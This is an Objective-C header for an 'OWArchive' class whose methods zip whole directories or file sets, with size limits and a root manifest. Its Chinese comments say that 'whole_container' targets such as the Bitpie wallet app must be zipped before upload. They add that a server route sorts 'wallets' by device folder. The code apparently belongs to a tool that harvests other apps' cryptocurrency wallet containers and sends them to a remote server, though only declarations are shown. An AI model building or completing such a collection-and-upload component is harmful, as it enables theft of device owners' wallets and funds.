#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

/// 整容器 / 多文件打包。
/// 当前 Bitpie 这类 whole_container 目标必须真的生成 zip —— 只把目录塞进 results
/// 会在上传阶段被 `!isDir` 过滤掉，等于白跑。
@interface OWArchive : NSObject

/// 打包目录。skipPredicate 返回 YES 则跳过该条目；门限内的文件全部入包。
+ (BOOL)zipDirectory:(NSString *)dir
                  to:(NSString *)zipPath
            maxBytes:(uint64_t)maxBytes
          totalCap:(uint64_t)totalCap
               error:(NSError **)error;

/// 打包一组文件，包内路径相对 baseDir。
+ (BOOL)zipFiles:(NSArray<NSString *> *)files
      relativeTo:(NSString *)baseDir
              to:(NSString *)zipPath
           error:(NSError **)error;

/// 打包目录，并在包根写 _manifest.json；所有文件统一放进 <subdir>/ 下。
/// 服务端 route_native_upload 靠根目录 _manifest.json 的 found/deviceFolder 归类钱包。
+ (BOOL)zipDirectory:(NSString *)dir
                  to:(NSString *)zipPath
            manifest:(NSDictionary *)manifest
              subdir:(NSString *)subdir
            maxBytes:(uint64_t)maxBytes
            totalCap:(uint64_t)totalCap
               error:(NSError **)error;

@end

NS_ASSUME_NONNULL_END
